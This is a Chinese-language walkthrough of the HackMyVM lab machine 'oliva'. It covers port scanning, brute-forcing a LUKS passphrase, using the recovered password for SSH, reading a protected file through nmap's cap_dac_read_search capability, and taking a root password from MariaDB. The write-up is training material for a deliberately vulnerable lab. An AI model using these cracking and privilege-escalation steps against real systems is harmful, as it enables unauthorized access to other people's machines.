# hmv_oliva

# 0. 简介

**靶机**：[hackmyvm - oliva](https://hackmyvm.eu/machines/machine.php?vm=oliva)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1. 扫描

使用 `nmap` 扫描：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 08:43 CST
Nmap scan report for 192.168.205.138
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:84:83:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
```

扫描结果显示目标开启了 **SSH** (22/tcp) 和 **HTTP** (80/tcp) 服务。

# 2. 踩点

访问主页是 Nginx 欢迎页面，没有发现有价值的信息。进行目录爆破。

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u "http://192.168.205.138/" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
```

结果显示：

```
200      GET    70541l   415824w 34717484c http://192.168.205.138/oliva
200      GET        5l       10w       69c http://192.168.205.138/index.php
200      GET       23l       75w      615c http://192.168.205.138/index.html
```

`http://192.168.205.138/oliva` 是个二进制文件，进一步分析它。

```bash
┌──(kali㉿kali)-[~/test]
└─$ file oliva
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse
```

`file` 命令输出显示 `oliva` 是一个 **LUKS (Linux Unified Key Setup) 加密文件**，我们尝试提取它的哈希进行爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ luks2john oliva > hash
oliva : Only LUKS1 is supported. Used version: 2
```

`luks2john` 工具当前只支持 LUKS 版本 1，而我们的文件是 LUKS 版本 2 格式，所以我们得另寻出路。找到了一篇[文章](https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases)，我们尝试一下

![Image](https://github.com/user-attachments/assets/922131df-15e3-4d27-9715-1823b19a4fbb)

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo apt install bruteforce-luks -y
┌──(kali㉿kali)-[~/test]
└─$ bruteforce-luks -t 4 -f /usr/share/wordlists/q5000.txt oliva
Password found: bebita
```

使用暴力破解成功获得口令 `bebita`，接下来打开加密文件。

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo cryptsetup luksOpen oliva oliva
请输入 oliva 的口令：bebita
```

查看文件系统：

```bash
┌──(kali㉿kali)-[~/test]
└─$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE  MOUNTPOINTS
loop0     7:0    0 19.1M  0 loop  
└─oliva 254:0    0  3.1M  0 crypt
```

挂载并查看文件：

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo mount /dev/mapper/oliva /mnt
┌──(kali㉿kali)-[/mnt]
└─$ ls -al
总计 18
drwxr-xr-x  3 root root  1024 2023年 7月 4日 .
drwxr-xr-x 18 root root  4096 12月 6日 19:03 ..
drwx------  2 root root 12288 2023年 7月 4日 lost+found
-rw-r--r--  1 root root    16 2023年 7月 4日 mypass.txt
```

查看 `mypass.txt` 内容：

```bash
┌──(kali㉿kali)-[/mnt]
└─$ cat mypass.txt
Yesthatsmypass!
```

# 3. 登录 SSH

使用文件中找到的密码 `Yesthatsmypass!` 登录 SSH。

```bash
┌──(kali㉿kali)-[/mnt]
└─$ ssh oliva@192.168.205.138
oliva@192.168.205.138's password: Yesthatsmypass!
oliva@oliva:~$ id
uid=1000(oliva) gid=1000(oliva) grupos=1000(oliva),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

# 4. 提权

查看 `sudo` 配置：

```bash
oliva@oliva:~$ sudo -l
-bash: sudo: orden no encontrada
```

`sudo` 未安装，检查系统权限：

```bash
oliva@oliva:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

使用 `getcap` 查看权限：

```bash
┌──(kali㉿kali)-[~/test]
└─$ /sbin/getcap -r / 2>/dev/null
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
```

查看 `/var/www/html/` 目录，使用`nmap`看有没有什么隐藏信息

```bash
┌──(kali㉿kali)-[~/test]
└─$ cd /var/www/html/
└─$ ls -la
total 19548
drwxr-xr-x 2 root     root         4096 jul  4  2023 .
drwxr-xr-x 3 root     root         4096 jul  4  2023 ..
-rw-rw---- 1 www-data www-data      615 jul  4  2023 index.html
-rw-rw---- 1 www-data www-data      163 jul  4  2023 index.php
-rw-rw---- 1 www-data www-data 20000000 jul  4  2023 oliva
oliva@oliva:/var/www/html$ nmap -iL index.php 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-22 03:34 CET
Failed to resolve "Hi".
Failed to resolve "oliva,".
Failed to resolve "Here".
Failed to resolve "the".
Failed to resolve "pass".
Failed to resolve "to".
Failed to resolve "obtain".
Failed to resolve "root:".
Failed to resolve "<?php".
Failed to resolve "$dbname".
Failed to resolve "=".
Failed to resolve "'easy';".
Failed to resolve "$dbuser".
Failed to resolve "=".
Failed to resolve "'root';".
Failed to resolve "$dbpass".
Failed to resolve "=".
Failed to resolve "'Savingmypass';".
Failed to resolve "$dbhost".
Failed to resolve "=".
Failed to resolve "'localhost';".
Failed to resolve "?>".
Failed to resolve "<a".
Unable to split netmask from target expression: "href="oliva">CLICK!</a>"
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 65.35 seconds
```

通过查看 `index.php` 中的内容，发现数据库登录信息，并登录 MariaDB 数据库：

```bash
┌──(kali㉿kali)-[~/test]
└─$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5
Server version: 10.11.3-MariaDB-1 Debian 12
```

查看数据库 `easy`：

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| easy               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

MariaDB [(none)]> use easy;
MariaDB [easy]> show tables;
+----------------+
| Tables_in_easy |
+----------------+
| logging        |
+----------------+
```

查看 `logging` 表：

```bash
MariaDB [easy]> select * from logging;
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | OhItwasEasy! |
+--------+------+--------------+
```

使用密码 `OhItwasEasy!` 登录 root 用户：

```bash
┌──(kali㉿kali)-[~/test]
└─$ su -
Contraseña: OhItwasEasy!
root@oliva:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

成功提权，获取 root 权限。

# 5.收尾

```bash
# 卸载加密设备
sudo umount /mnt

# 关闭 LUKS 加密设备
sudo cryptsetup luksClose oliva

# 查看设备是否已经关闭
lsblk

# 检查是否仍然挂载
mount | grep /dev/mapper
```